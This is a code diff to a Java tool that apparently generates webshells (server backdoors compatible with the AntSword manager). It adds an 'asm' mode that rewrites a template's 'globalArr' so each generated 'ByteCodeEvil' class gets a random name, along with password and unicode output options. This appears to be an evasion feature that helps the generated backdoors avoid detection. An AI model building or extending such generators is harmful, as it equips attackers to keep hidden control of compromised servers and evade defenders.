@@ -11,7 +11,6 @@ import com.github.javaparser.ast.expr.ArrayInitializerExpr;
 import com.github.javaparser.ast.expr.StringLiteralExpr;
 import com.github.javaparser.ast.type.ClassOrInterfaceType;
 import org.sec.Main;
-import org.sec.core.ByteCodeEvil;
 import org.sec.core.ByteCodeEvilDump;
 import org.sec.input.Command;
 import org.sec.input.Logo;
@@ -25,8 +24,6 @@ import org.sec.util.WriteUtil;
 
 import java.io.IOException;
 import java.io.InputStream;
-import java.nio.file.Files;
-import java.nio.file.Paths;
 import java.util.Base64;
 import java.util.List;
 
@@ -57,6 +54,10 @@ public class Application {
                 doProxy(command);
                 return;
             }
+            if (command.asmModule) {
+                doAsm(command);
+                return;
+            }
             if (command.antSword) {
                 doAnt(command);
                 return;
@@ -72,6 +73,26 @@ public class Application {
         MethodDeclaration decMethod = getMethod("Dec.java");
         if (newMethod == null || decMethod == null) {
             return;
+        }
+        normalOperate(newMethod);
+        decCodeOperate(decMethod);
+        WriteUtil.write(newMethod, decMethod, command.password, command.unicode);
+        System.out.println("Finish!");
+    }
+
+    private static void doAsm(Command command) throws IOException {
+        MethodDeclaration newMethod = getMethod("Asm.java");
+        MethodDeclaration decMethod = getMethod("Dec.java");
+        if (newMethod == null || decMethod == null) {
+            return;
+        }
+        List<VariableDeclarator> vds = newMethod.findAll(VariableDeclarator.class);
+        for (VariableDeclarator vd : vds) {
+            if (vd.getNameAsString().equals("globalArr")) {
+                List<StringLiteralExpr> sles = vd.findAll(StringLiteralExpr.class);
+                String newName = "sample/ByteCodeEvil" + RandomUtil.getRandomString(10);
+                sles.get(3).setValue(newName);
+            }
         }
         normalOperate(newMethod);
         decCodeOperate(decMethod);
